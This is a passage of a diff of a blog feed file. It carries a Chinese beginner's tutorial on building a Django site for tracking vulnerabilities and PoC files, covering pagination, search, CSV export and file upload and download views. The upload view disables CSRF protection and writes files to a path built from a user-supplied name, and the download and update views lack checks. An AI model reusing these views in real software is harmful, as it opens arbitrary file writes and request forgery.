+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@require_http_methods([&quot;GET&quot;, ])</span><br><span class="line">def vulinfo(request):</span><br><span class="line">    data_sum &#x3D; vul_info.objects.order_by(&#39;vul_id&#39;) </span><br><span class="line">    paginator &#x3D; Paginator(data_sum, 6)  # 每页6条记录</span><br><span class="line">    page &#x3D; request.GET.get(&#39;page&#39;, 1)</span><br><span class="line">    currentpage &#x3D; int(page)</span><br><span class="line">    all_page_num &#x3D; paginator.num_pages</span><br><span class="line">    try:</span><br><span class="line">        # 获取当前页码的记录</span><br><span class="line">        data_sum &#x3D; paginator.page(page)</span><br><span class="line">    except PageNotAnInteger:</span><br><span class="line">        # 如果用户输入的页码不是整数时,显示第1页的内容</span><br><span class="line">        data_sum &#x3D; paginator.page(1)</span><br><span class="line">    except EmptyPage:</span><br><span class="line">        # 如果用户输入的页数不在系统的页码列表中时,显示最后一页的内容</span><br><span class="line">        data_sum &#x3D; paginator.page(paginator.num_pages)</span><br><span class="line"></span><br><span class="line">    info &#x3D; &#123;</span><br><span class="line">        &quot;vuls&quot;: data_sum, # 定义了返回的数据名，在前端可以利用for循环来读取数据库里的内容</span><br><span class="line">        &quot;currentpage&quot;: currentpage,</span><br><span class="line">        &quot;all_page_num&quot;: all_page_num</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return render(request, &#39;vulinfo.html&#39;, info) # vulinfo.html是前端页面的名字</span><br></pre></td></tr></table></figure>
+
+<p>urls.py:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">path(r&#39;^vulinfo&#x2F;(?P&lt;pageNumber&gt;\d+)&#39;, views.vulinfo, name&#x3D;&#39;vulinfo&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>前端页面：</p>
+<p>通过for循环，可以返回需要的数据，同时做了一个详细页面点击的链接</p>
+<p><img src="/2021/03/05/django-webproject/image-20210301111120033-4928991.png" alt="image-20210301111120033"></p>
+<p>效果图如下：</p>
+<p><img src="/2021/03/05/django-webproject/image-20210301111200294-4928991.png" alt="image-20210301111200294"></p>
+<h6 id="0x14-提交信息页面：（-上传文件）"><a href="#0x14-提交信息页面：（-上传文件）" class="headerlink" title="0x14 提交信息页面：（+上传文件）"></a>0x14 提交信息页面：（+上传文件）</h6><p>使用forms进行信息的提交，在forms中进行定义：</p>
+<p><img src="/2021/03/05/django-webproject/image-20210301114000246-4928991.png" alt="image-20210301114000246"></p>
+<p>view.py：（加了上传文件的功能）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@csrf_exempt</span><br><span class="line">@require_http_methods([&quot;GET&quot;, &quot;POST&quot;])</span><br><span class="line">def vul_upload(request):</span><br><span class="line">    if request.method &#x3D;&#x3D; &quot;POST&quot;:</span><br><span class="line">        form &#x3D; VulUploadForm(request.POST) # 获取form的内容</span><br><span class="line">        print(request.POST)</span><br><span class="line">        </span><br><span class="line">				# 上传文件功能</span><br><span class="line">        file_obj &#x3D; request.FILES.get(&quot;poc_file&quot;, None)</span><br><span class="line">        destination &#x3D; open(os.path.join(&quot;#输入上传文件的地址&quot;, request.POST.get(&quot;poc_file&quot;)),&#39;wb+&#39;)</span><br><span class="line">        for i in file_obj.chunks():</span><br><span class="line">            destination.write(i)</span><br><span class="line">        destination.close()</span><br><span class="line">        print(form)</span><br><span class="line"></span><br><span class="line">        if form.is_valid():</span><br><span class="line">            form.save()</span><br><span class="line">            return HttpResponse(&quot;新增成功&quot;)</span><br><span class="line">            content &#x3D; &#123;</span><br><span class="line">                &quot;form&quot;: form</span><br><span class="line">            &#125;</span><br><span class="line">            return render(request, &quot;insert.html&quot;, content)</span><br><span class="line">        else:</span><br><span class="line">            return HttpResponse(&#39;Sorry...&#39;)</span><br><span class="line">    return render(request, &#39;insert.html&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>效果图如下：</p>
+<p><img src="/2021/03/05/django-webproject/image-20210305141424306-4928991.png" alt="image-20210305141424306"></p>
+<p>下拉框和日期选择实现：</p>
+<p><img src="/2021/03/05/django-webproject/image-20210305141616584-4928991.png" alt="image-20210305141616584"></p>
+<h6 id="0x15-详细信息页面："><a href="#0x15-详细信息页面：" class="headerlink" title="0x15 详细信息页面："></a>0x15 详细信息页面：</h6><p>展示所有数据库的数据，并对一部分数据提供修改的功能：</p>
+<p>效果图如下：</p>
+<p><img src="/2021/03/05/django-webproject/image-20210305141656027-4928991.png" alt="image-20210305141656027"></p>
+<p>信息展示的前端同基础展示信息页面</p>
+<p>修改功能使用了模态框+js</p>
+<p>view.py:</p>
+<p>通过js实现post，传输前端数据，获取对应的vul_id和要更新的数据</p>
+<p>主要语句：vul_info.objects.filter(vul_id=xx).update(snort=xx)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def update_snort(request):</span><br><span class="line">    if request.method &#x3D;&#x3D; &quot;POST&quot;:</span><br><span class="line">        snort_info &#x3D; request.POST.get(&#39;snort&#39;)</span><br><span class="line">        snort_detail &#x3D; request.POST.get(&#39;snort_detail&#39;)</span><br><span class="line">        vulid &#x3D; request.POST.get(&#39;vul_id&#39;)</span><br><span class="line">        vul_info.objects.filter(vul_id&#x3D;vulid).update(snort&#x3D;snort_info)</span><br><span class="line">        vul_info.objects.filter(vul_id&#x3D;vulid).update(snort_detail&#x3D;snort_detail)</span><br><span class="line">        return HttpResponse(&#39;save success!&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def update_track(request):</span><br><span class="line">    if request.method &#x3D;&#x3D; &quot;POST&quot;:</span><br><span class="line">        track_info &#x3D; request.POST.get(&#39;track_stauts&#39;, &#39;&#39;)</span><br><span class="line">        vulid &#x3D; request.POST.get(&#39;vul_id&#39;)</span><br><span class="line">        print(vulid)</span><br><span class="line">        vul_info.objects.filter(vul_id&#x3D;vulid).update(track_stauts&#x3D;track_info)</span><br><span class="line">        return HttpResponse(&#39;save success!&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>前端：</p>
+<p><img src="/2021/03/05/django-webproject/image-20210305142711997-4928991.png" alt="image-20210305142711997"></p>
+<p>js:</p>
+<p><img src="/2021/03/05/django-webproject/image-20210305142818341-4928991.png" alt="image-20210305142818341"></p>
+<p>效果图：</p>
+<p><img src="/2021/03/05/django-webproject/image-20210305142905738-4928991.png" alt="image-20210305142905738"></p>
+<p>至此基础功能都已经实现</p>
+<h5 id="0x2-附加功能"><a href="#0x2-附加功能" class="headerlink" title="0x2 附加功能"></a>0x2 附加功能</h5><h6 id="0x21-搜索功能"><a href="#0x21-搜索功能" class="headerlink" title="0x21 搜索功能"></a>0x21 搜索功能</h6><p>使用q搜索，提供名字\cve\cnnvd的搜索</p>
+<p>view.py：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def search(request):</span><br><span class="line">    q &#x3D; request.GET.get(&#39;q&#39;)</span><br><span class="line">    search_list &#x3D; vul_info.objects.filter(Q(name__icontains&#x3D;q) | Q(cve__icontains&#x3D;q) | Q(cnnvd__icontains&#x3D;q) )</span><br><span class="line">    error_msg &#x3D; &#39;No result&#39;</span><br><span class="line">    return render(request, &#39;vulinfo.html&#39;, &#123;&#39;vuls&#39;: search_list,</span><br><span class="line">                                            &#39;error_msg&#39;: error_msg,</span><br><span class="line">                                            &#125;)</span><br></pre></td></tr></table></figure>
+
+<p>前端：</p>
+<p><img src="/2021/03/05/django-webproject/image-20210305143500136-4928991.png" alt="image-20210305143500136"></p>
+<p>效果：</p>
+<p>在这里输入关键字即可：</p>
+<p><img src="/2021/03/05/django-webproject/image-20210305143657723-4928991.png" alt="image-20210305143657723"></p>
+<h6 id="0x22-下拉框筛选显示"><a href="#0x22-下拉框筛选显示" class="headerlink" title="0x22 下拉框筛选显示"></a>0x22 下拉框筛选显示</h6><p>事先预定好了一些关键筛选，点击即可跳转对应的筛选页面：</p>
+<p>筛选页面view.py：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def filter_1(request):</span><br><span class="line">    search_lists &#x3D; vul_info.objects.filter(Q(protection_status_ips&#x3D;1) &amp; Q(protection_status_sac&#x3D;1))</span><br><span class="line">    error_msg &#x3D; &#39;No result&#39;</span><br><span class="line">    return render(request, &#39;vulinfo.html&#39;, &#123;&#39;vuls&#39;: search_lists,</span><br><span class="line">                                            &#39;error_msg&#39;: error_msg,</span><br><span class="line">                                            &#125;)</span><br></pre></td></tr></table></figure>
+
+<p>前端：下拉框使用dropdown，点击后就会跳转</p>
+<p><img src="/2021/03/05/django-webproject/image-20210305143848554-4928991.png" alt="image-20210305143848554"></p>
+<p>效果图：</p>
+<p><img src="/2021/03/05/django-webproject/image-20210305143711042-4928991.png" alt="image-20210305143711042"></p>
+<h6 id="0x23-导出"><a href="#0x23-导出" class="headerlink" title="0x23 导出"></a>0x23 导出</h6><p>前端写了一个导出按钮，点击即可输出为一个csv文件，支持不同筛选页面的输出</p>
+<p>view.py:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def export(request):</span><br><span class="line">    vul_lis &#x3D; vul_info.objects.all()</span><br><span class="line">    response &#x3D; HttpResponse(content_type&#x3D;&#39;text&#x2F;csv&#39;)</span><br><span class="line">    time_now &#x3D; time.strftime(&#39;%Y%m%d&#39;)</span><br><span class="line">    filename &#x3D; &#39;vul_&#39; + time_now</span><br><span class="line">    response.write(codecs.BOM_UTF8)</span><br><span class="line">    response[&#39;Content-Disposition&#39;] &#x3D; f&#39;attachment; filename&#x3D;&quot;&#123;filename&#125;.csv&quot;&#39;</span><br><span class="line">    writer &#x3D; csv.writer(response)</span><br><span class="line">    writer.writerow([&#39;vul_id&#39;, &#39;name&#39;, &#39;track&#39;, &#39;poc&#39;,</span><br><span class="line">                     &#39;snort&#39;, &#39;cve&#39;, &#39;cnnvd&#39;,</span><br><span class="line">                     &#39;ips&#39;, &#39;sac&#39;, &#39;note&#39;, &#39;update-time&#39;])</span><br><span class="line">    for vul in vul_lis:</span><br><span class="line">        writer.writerow([vul.vul_id, vul.name, vul.track_stauts, vul.poc, vul.snort, vul.cve, vul.cnnvd,</span><br><span class="line">                         vul.protection_status_ips, vul.protection_status_sac, vul.note, vul.updated_time])</span><br><span class="line">    return response</span><br></pre></td></tr></table></figure>
+
+<p>前端：</p>
+<p><img src="/2021/03/05/django-webproject/image-20210305144111506-4928991.png" alt="image-20210305144111506"></p>
+<p>效果图：</p>
+<p><img src="/2021/03/05/django-webproject/image-20210305144435191-4928991.png" alt="image-20210305144435191"></p>
+<h6 id="0x24-信息汇总页面"><a href="#0x24-信息汇总页面" class="headerlink" title="0x24 信息汇总页面"></a>0x24 信息汇总页面</h6><p>使用了c3表格，有模板</p>
+<p>view.py：传输了一些数据到前端</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def index(request):</span><br><span class="line">    sum &#x3D; vul_info.objects.all().count()</span><br><span class="line">    high &#x3D; vul_info.objects.filter(severity&#x3D;&#39;2&#39;).count()</span><br><span class="line">    med &#x3D; vul_info.objects.filter(severity&#x3D;&#39;1&#39;).count()</span><br><span class="line">    low &#x3D; vul_info.objects.filter(severity&#x3D;&#39;0&#39;).count()</span><br><span class="line">    wgzs &#x3D; vul_info.objects.filter(track_stauts&#x3D;&#39;0&#39;).count()</span><br><span class="line">    gzzs &#x3D; vul_info.objects.filter(track_stauts&#x3D;&#39;1&#39;).count()</span><br><span class="line">    ygzs &#x3D; vul_info.objects.filter(track_stauts&#x3D;&#39;2&#39;).count()</span><br><span class="line">    tgips &#x3D; vul_info.objects.filter(Q(protection_status_ips&#x3D;1) &amp; Q(protection_status_sac&#x3D;1)).count()</span><br><span class="line">    tg &#x3D; vul_info.objects.filter(Q(protection_status_ips&#x3D;0) &amp; Q(protection_status_sac&#x3D;1)).count()</span><br><span class="line">    ips &#x3D; vul_info.objects.filter(Q(protection_status_ips&#x3D;1) &amp; Q(protection_status_sac&#x3D;0)).count()</span><br><span class="line">    ntgips &#x3D; vul_info.objects.filter(Q(protection_status_ips&#x3D;0) &amp; Q(protection_status_sac&#x3D;0)).count()</span><br><span class="line">    d &#x3D; int(tgips &#x2F; sum * 100)</span><br><span class="line">    e &#x3D; int(tg &#x2F; sum * 100)</span><br><span class="line">    f &#x3D; int(ips &#x2F; sum * 100)</span><br><span class="line">    g &#x3D; int(ntgips &#x2F; sum * 100)</span><br><span class="line">    a &#x3D; int(wgzs &#x2F; sum * 100)</span><br><span class="line">    b &#x3D; int(gzzs &#x2F; sum * 100)</span><br><span class="line">    c &#x3D; int(ygzs &#x2F; sum * 100)</span><br><span class="line"></span><br><span class="line">    return render(request, &#39;index.html&#39;, &#123;&#39;sum&#39;: sum, &#39;high&#39;: high, &#39;med&#39;: med, &#39;low&#39;: low,</span><br><span class="line">                                          &#39;wgz&#39;: a, &#39;gzz&#39;: b, &#39;ygz&#39;: c,</span><br><span class="line">                                          &#39;wgzs&#39;: wgzs, &#39;gzzs&#39;: gzzs, &#39;ygzs&#39;: ygzs,</span><br><span class="line">                                          &#39;tgips&#39;: d, &#39;tg&#39;: e, &#39;ips&#39;: f,&#39;ntgips&#39;: g,</span><br><span class="line">                                          &#39;tgipss&#39;: tgips, &#39;tgs&#39;: tg, &#39;ipss&#39;: ips,&#39;ntgipss&#39;: ntgips&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>效果图：</p>
+<p><img src="/2021/03/05/django-webproject/image-20210305144403691-4928991.png" alt="image-20210305144403691"></p>
+<h6 id="0x25-文件下载"><a href="#0x25-文件下载" class="headerlink" title="0x25 文件下载"></a>0x25 文件下载</h6><p>单个poc文件下载功能，直接在页面上做了下载链接，点击即可下载对应poc：</p>
+<p>view.py：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def download_file(request, vul_id):</span><br><span class="line">    search_lists &#x3D; vul_info.objects.get(vul_id&#x3D;vul_id)</span><br><span class="line">    file_name &#x3D; search_lists.poc_file</span><br><span class="line">    the_file_name &#x3D; &#39;#文件存储的地址&#39;+ file_name</span><br><span class="line">    file &#x3D; open(the_file_name, &#39;rb&#39;)</span><br><span class="line">    response &#x3D; StreamingHttpResponse(file)</span><br><span class="line">    response[&#39;Content-Type&#39;] &#x3D; &#39;application&#x2F;octet-stream&#39;</span><br><span class="line">    response[&#39;Content-Disposition&#39;] &#x3D; &#39;attachement;filename&#x3D;&quot;&#123;0&#125;&quot;&#39;.format(file_name)</span><br><span class="line">    return response</span><br></pre></td></tr></table></figure>
+
+<p>前端：</p>
+<p><img src="/2021/03/05/django-webproject/image-20210305144648161-4928991.png" alt="image-20210305144648161"></p>
+<p>效果图：</p>
+<p><img src="/2021/03/05/django-webproject/image-20210305144804727-4928991.png" alt="image-20210305144804727"></p>
+]]></content>
+      <tags>
+        <tag>django</tag>
+        <tag>python-web</tag>
+      </tags>
   </entry>
   <entry>
     <title>funnyre-花指令与符号执行angr</title>
@@ -1560,154 +1711,6 @@
       </tags>
   </entry>
   <entry>
-    <title>django-webproject</title>
-    <url>/2021/03/05/django-webproject/</url>
-    <content><![CDATA[<h4 id="django网站搭建"><a href="#django网站搭建" class="headerlink" title="django网站搭建"></a>django网站搭建</h4><p>–关于我最近在干嘛–</p>
-<p>零基础开始的一个独立bootstrap+django网站搭建学习</p>
-<p>需求：增删改查+上传下载文件+导出数据到csv+筛选+搜索</p>
-<p>项目完整代码：<a href="https://github.com/0xkami/django-web">https://github.com/0xkami/django-web</a></p>
-<a id="more"></a>
-
-<h5 id="0x1-基础功能"><a href="#0x1-基础功能" class="headerlink" title="0x1 基础功能"></a>0x1 基础功能</h5><p>利用pycharm搭建一个django项目，可以成功开启最基础的访问</p>
-<p>前端使用bootstrap，模版使用的是clearmin，很简洁的一个管理平台</p>
-<h6 id="0x11-整体框架："><a href="#0x11-整体框架：" class="headerlink" title="0x11 整体框架："></a>0x11 整体框架：</h6><img src="/2021/03/05/django-webproject/image-20210301101823208.png" alt="image-20210301101823208">
-
-<p>urls.py:</p>
-<p><img src="/2021/03/05/django-webproject/image-20210305143550833-4928991.png" alt="image-20210305143550833"></p>
-<h6 id="0x12-数据库设计："><a href="#0x12-数据库设计：" class="headerlink" title="0x12 数据库设计："></a>0x12 数据库设计：</h6><p>在电脑上装好sql，使用navicat创建连接，在django项目中创建对于数据库并迁移</p>
-<p>以下就是需要存到数据库中的信息字段：</p>
-<p><img src="/2021/03/05/django-webproject/image-20210301102403994-4928991.png" alt="image-20210301102403994"></p>
-<p>在整体项目（和url文件在同一文件夹下）的settings中添加数据库的信息：</p>
-<p><img src="/2021/03/05/django-webproject/image-20210301102612299-4928991.png" alt="image-20210301102612299"></p>
-<p>在项目命令行运行 <code>python manage.py makemigrations</code>和<code>python manage.py migrate </code>，在navicat就能看到创建好的数据库</p>
-<p><img src="/2021/03/05/django-webproject/image-20210301104219610-4928991.png" alt="image-20210301104219610"></p>
-<h6 id="0x13-基础展示信息页面：（-分页）"><a href="#0x13-基础展示信息页面：（-分页）" class="headerlink" title="0x13 基础展示信息页面：（+分页）"></a>0x13 基础展示信息页面：（+分页）</h6><p>在数据库中插入一些信息，然后想要在某个页面中以表格的形式展示它的部分内容</p>
-<p>重点代码：<code>data_sum = vul_info.objects.order_by(&#39;vul_id&#39;)</code>，vul_info是model中的类名，order_by可以根据固定字段来进行排序</p>
-<p>view.py中此功能完整代码：（加了分页的功能）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@require_http_methods([&quot;GET&quot;, ])</span><br><span class="line">def vulinfo(request):</span><br><span class="line">    data_sum &#x3D; vul_info.objects.order_by(&#39;vul_id&#39;) </span><br><span class="line">    paginator &#x3D; Paginator(data_sum, 6)  # 每页6条记录</span><br><span class="line">    page &#x3D; request.GET.get(&#39;page&#39;, 1)</span><br><span class="line">    currentpage &#x3D; int(page)</span><br><span class="line">    all_page_num &#x3D; paginator.num_pages</span><br><span class="line">    try:</span><br><span class="line">        # 获取当前页码的记录</span><br><span class="line">        data_sum &#x3D; paginator.page(page)</span><br><span class="line">    except PageNotAnInteger:</span><br><span class="line">        # 如果用户输入的页码不是整数时,显示第1页的内容</span><br><span class="line">        data_sum &#x3D; paginator.page(1)</span><br><span class="line">    except EmptyPage:</span><br><span class="line">        # 如果用户输入的页数不在系统的页码列表中时,显示最后一页的内容</span><br><span class="line">        data_sum &#x3D; paginator.page(paginator.num_pages)</span><br><span class="line"></span><br><span class="line">    info &#x3D; &#123;</span><br><span class="line">        &quot;vuls&quot;: data_sum, # 定义了返回的数据名，在前端可以利用for循环来读取数据库里的内容</span><br><span class="line">        &quot;currentpage&quot;: currentpage,</span><br><span class="line">        &quot;all_page_num&quot;: all_page_num</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return render(request, &#39;vulinfo.html&#39;, info) # vulinfo.html是前端页面的名字</span><br></pre></td></tr></table></figure>
-
-<p>urls.py:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">path(r&#39;^vulinfo&#x2F;(?P&lt;pageNumber&gt;\d+)&#39;, views.vulinfo, name&#x3D;&#39;vulinfo&#39;)</span><br></pre></td></tr></table></figure>
-
-<p>前端页面：</p>
-<p>通过for循环，可以返回需要的数据，同时做了一个详细页面点击的链接</p>
-<p><img src="/2021/03/05/django-webproject/image-20210301111120033-4928991.png" alt="image-20210301111120033"></p>
-<p>效果图如下：</p>
-<p><img src="/2021/03/05/django-webproject/image-20210301111200294-4928991.png" alt="image-20210301111200294"></p>
-<h6 id="0x14-提交信息页面：（-上传文件）"><a href="#0x14-提交信息页面：（-上传文件）" class="headerlink" title="0x14 提交信息页面：（+上传文件）"></a>0x14 提交信息页面：（+上传文件）</h6><p>使用forms进行信息的提交，在forms中进行定义：</p>
-<p><img src="/2021/03/05/django-webproject/image-20210301114000246-4928991.png" alt="image-20210301114000246"></p>
-<p>view.py：（加了上传文件的功能）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@csrf_exempt</span><br><span class="line">@require_http_methods([&quot;GET&quot;, &quot;POST&quot;])</span><br><span class="line">def vul_upload(request):</span><br><span class="line">    if request.method &#x3D;&#x3D; &quot;POST&quot;:</span><br><span class="line">        form &#x3D; VulUploadForm(request.POST) # 获取form的内容</span><br><span class="line">        print(request.POST)</span><br><span class="line">        </span><br><span class="line">				# 上传文件功能</span><br><span class="line">        file_obj &#x3D; request.FILES.get(&quot;poc_file&quot;, None)</span><br><span class="line">        destination &#x3D; open(os.path.join(&quot;#输入上传文件的地址&quot;, request.POST.get(&quot;poc_file&quot;)),&#39;wb+&#39;)</span><br><span class="line">        for i in file_obj.chunks():</span><br><span class="line">            destination.write(i)</span><br><span class="line">        destination.close()</span><br><span class="line">        print(form)</span><br><span class="line"></span><br><span class="line">        if form.is_valid():</span><br><span class="line">            form.save()</span><br><span class="line">            return HttpResponse(&quot;新增成功&quot;)</span><br><span class="line">            content &#x3D; &#123;</span><br><span class="line">                &quot;form&quot;: form</span><br><span class="line">            &#125;</span><br><span class="line">            return render(request, &quot;insert.html&quot;, content)</span><br><span class="line">        else:</span><br><span class="line">            return HttpResponse(&#39;Sorry...&#39;)</span><br><span class="line">    return render(request, &#39;insert.html&#39;)</span><br></pre></td></tr></table></figure>
-
-<p>效果图如下：</p>
-<p><img src="/2021/03/05/django-webproject/image-20210305141424306-4928991.png" alt="image-20210305141424306"></p>
-<p>下拉框和日期选择实现：</p>
-<p><img src="/2021/03/05/django-webproject/image-20210305141616584-4928991.png" alt="image-20210305141616584"></p>
-<h6 id="0x15-详细信息页面："><a href="#0x15-详细信息页面：" class="headerlink" title="0x15 详细信息页面："></a>0x15 详细信息页面：</h6><p>展示所有数据库的数据，并对一部分数据提供修改的功能：</p>
-<p>效果图如下：</p>
-<p><img src="/2021/03/05/django-webproject/image-20210305141656027-4928991.png" alt="image-20210305141656027"></p>
-<p>信息展示的前端同基础展示信息页面</p>
-<p>修改功能使用了模态框+js</p>
-<p>view.py:</p>
-<p>通过js实现post，传输前端数据，获取对应的vul_id和要更新的数据</p>
-<p>主要语句：vul_info.objects.filter(vul_id=xx).update(snort=xx)</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def update_snort(request):</span><br><span class="line">    if request.method &#x3D;&#x3D; &quot;POST&quot;:</span><br><span class="line">        snort_info &#x3D; request.POST.get(&#39;snort&#39;)</span><br><span class="line">        snort_detail &#x3D; request.POST.get(&#39;snort_detail&#39;)</span><br><span class="line">        vulid &#x3D; request.POST.get(&#39;vul_id&#39;)</span><br><span class="line">        vul_info.objects.filter(vul_id&#x3D;vulid).update(snort&#x3D;snort_info)</span><br><span class="line">        vul_info.objects.filter(vul_id&#x3D;vulid).update(snort_detail&#x3D;snort_detail)</span><br><span class="line">        return HttpResponse(&#39;save success!&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def update_track(request):</span><br><span class="line">    if request.method &#x3D;&#x3D; &quot;POST&quot;:</span><br><span class="line">        track_info &#x3D; request.POST.get(&#39;track_stauts&#39;, &#39;&#39;)</span><br><span class="line">        vulid &#x3D; request.POST.get(&#39;vul_id&#39;)</span><br><span class="line">        print(vulid)</span><br><span class="line">        vul_info.objects.filter(vul_id&#x3D;vulid).update(track_stauts&#x3D;track_info)</span><br><span class="line">        return HttpResponse(&#39;save success!&#39;)</span><br></pre></td></tr></table></figure>
-
-<p>前端：</p>
-<p><img src="/2021/03/05/django-webproject/image-20210305142711997-4928991.png" alt="image-20210305142711997"></p>
-<p>js:</p>
-<p><img src="/2021/03/05/django-webproject/image-20210305142818341-4928991.png" alt="image-20210305142818341"></p>
-<p>效果图：</p>
-<p><img src="/2021/03/05/django-webproject/image-20210305142905738-4928991.png" alt="image-20210305142905738"></p>
-<p>至此基础功能都已经实现</p>
-<h5 id="0x2-附加功能"><a href="#0x2-附加功能" class="headerlink" title="0x2 附加功能"></a>0x2 附加功能</h5><h6 id="0x21-搜索功能"><a href="#0x21-搜索功能" class="headerlink" title="0x21 搜索功能"></a>0x21 搜索功能</h6><p>使用q搜索，提供名字\cve\cnnvd的搜索</p>
-<p>view.py：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def search(request):</span><br><span class="line">    q &#x3D; request.GET.get(&#39;q&#39;)</span><br><span class="line">    search_list &#x3D; vul_info.objects.filter(Q(name__icontains&#x3D;q) | Q(cve__icontains&#x3D;q) | Q(cnnvd__icontains&#x3D;q) )</span><br><span class="line">    error_msg &#x3D; &#39;No result&#39;</span><br><span class="line">    return render(request, &#39;vulinfo.html&#39;, &#123;&#39;vuls&#39;: search_list,</span><br><span class="line">                                            &#39;error_msg&#39;: error_msg,</span><br><span class="line">                                            &#125;)</span><br></pre></td></tr></table></figure>
-
-<p>前端：</p>
-<p><img src="/2021/03/05/django-webproject/image-20210305143500136-4928991.png" alt="image-20210305143500136"></p>
-<p>效果：</p>
-<p>在这里输入关键字即可：</p>
-<p><img src="/2021/03/05/django-webproject/image-20210305143657723-4928991.png" alt="image-20210305143657723"></p>
-<h6 id="0x22-下拉框筛选显示"><a href="#0x22-下拉框筛选显示" class="headerlink" title="0x22 下拉框筛选显示"></a>0x22 下拉框筛选显示</h6><p>事先预定好了一些关键筛选，点击即可跳转对应的筛选页面：</p>
-<p>筛选页面view.py：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def filter_1(request):</span><br><span class="line">    search_lists &#x3D; vul_info.objects.filter(Q(protection_status_ips&#x3D;1) &amp; Q(protection_status_sac&#x3D;1))</span><br><span class="line">    error_msg &#x3D; &#39;No result&#39;</span><br><span class="line">    return render(request, &#39;vulinfo.html&#39;, &#123;&#39;vuls&#39;: search_lists,</span><br><span class="line">                                            &#39;error_msg&#39;: error_msg,</span><br><span class="line">                                            &#125;)</span><br></pre></td></tr></table></figure>
-
-<p>前端：下拉框使用dropdown，点击后就会跳转</p>
-<p><img src="/2021/03/05/django-webproject/image-20210305143848554-4928991.png" alt="image-20210305143848554"></p>
-<p>效果图：</p>
-<p><img src="/2021/03/05/django-webproject/image-20210305143711042-4928991.png" alt="image-20210305143711042"></p>
-<h6 id="0x23-导出"><a href="#0x23-导出" class="headerlink" title="0x23 导出"></a>0x23 导出</h6><p>前端写了一个导出按钮，点击即可输出为一个csv文件，支持不同筛选页面的输出</p>
-<p>view.py:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def export(request):</span><br><span class="line">    vul_lis &#x3D; vul_info.objects.all()</span><br><span class="line">    response &#x3D; HttpResponse(content_type&#x3D;&#39;text&#x2F;csv&#39;)</span><br><span class="line">    time_now &#x3D; time.strftime(&#39;%Y%m%d&#39;)</span><br><span class="line">    filename &#x3D; &#39;vul_&#39; + time_now</span><br><span class="line">    response.write(codecs.BOM_UTF8)</span><br><span class="line">    response[&#39;Content-Disposition&#39;] &#x3D; f&#39;attachment; filename&#x3D;&quot;&#123;filename&#125;.csv&quot;&#39;</span><br><span class="line">    writer &#x3D; csv.writer(response)</span><br><span class="line">    writer.writerow([&#39;vul_id&#39;, &#39;name&#39;, &#39;track&#39;, &#39;poc&#39;,</span><br><span class="line">                     &#39;snort&#39;, &#39;cve&#39;, &#39;cnnvd&#39;,</span><br><span class="line">                     &#39;ips&#39;, &#39;sac&#39;, &#39;note&#39;, &#39;update-time&#39;])</span><br><span class="line">    for vul in vul_lis:</span><br><span class="line">        writer.writerow([vul.vul_id, vul.name, vul.track_stauts, vul.poc, vul.snort, vul.cve, vul.cnnvd,</span><br><span class="line">                         vul.protection_status_ips, vul.protection_status_sac, vul.note, vul.updated_time])</span><br><span class="line">    return response</span><br></pre></td></tr></table></figure>
-
-<p>前端：</p>
-<p><img src="/2021/03/05/django-webproject/image-20210305144111506-4928991.png" alt="image-20210305144111506"></p>
-<p>效果图：</p>
-<p><img src="/2021/03/05/django-webproject/image-20210305144435191-4928991.png" alt="image-20210305144435191"></p>
-<h6 id="0x24-信息汇总页面"><a href="#0x24-信息汇总页面" class="headerlink" title="0x24 信息汇总页面"></a>0x24 信息汇总页面</h6><p>使用了c3表格，有模板</p>
-<p>view.py：传输了一些数据到前端</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def index(request):</span><br><span class="line">    sum &#x3D; vul_info.objects.all().count()</span><br><span class="line">    high &#x3D; vul_info.objects.filter(severity&#x3D;&#39;2&#39;).count()</span><br><span class="line">    med &#x3D; vul_info.objects.filter(severity&#x3D;&#39;1&#39;).count()</span><br><span class="line">    low &#x3D; vul_info.objects.filter(severity&#x3D;&#39;0&#39;).count()</span><br><span class="line">    wgzs &#x3D; vul_info.objects.filter(track_stauts&#x3D;&#39;0&#39;).count()</span><br><span class="line">    gzzs &#x3D; vul_info.objects.filter(track_stauts&#x3D;&#39;1&#39;).count()</span><br><span class="line">    ygzs &#x3D; vul_info.objects.filter(track_stauts&#x3D;&#39;2&#39;).count()</span><br><span class="line">    tgips &#x3D; vul_info.objects.filter(Q(protection_status_ips&#x3D;1) &amp; Q(protection_status_sac&#x3D;1)).count()</span><br><span class="line">    tg &#x3D; vul_info.objects.filter(Q(protection_status_ips&#x3D;0) &amp; Q(protection_status_sac&#x3D;1)).count()</span><br><span class="line">    ips &#x3D; vul_info.objects.filter(Q(protection_status_ips&#x3D;1) &amp; Q(protection_status_sac&#x3D;0)).count()</span><br><span class="line">    ntgips &#x3D; vul_info.objects.filter(Q(protection_status_ips&#x3D;0) &amp; Q(protection_status_sac&#x3D;0)).count()</span><br><span class="line">    d &#x3D; int(tgips &#x2F; sum * 100)</span><br><span class="line">    e &#x3D; int(tg &#x2F; sum * 100)</span><br><span class="line">    f &#x3D; int(ips &#x2F; sum * 100)</span><br><span class="line">    g &#x3D; int(ntgips &#x2F; sum * 100)</span><br><span class="line">    a &#x3D; int(wgzs 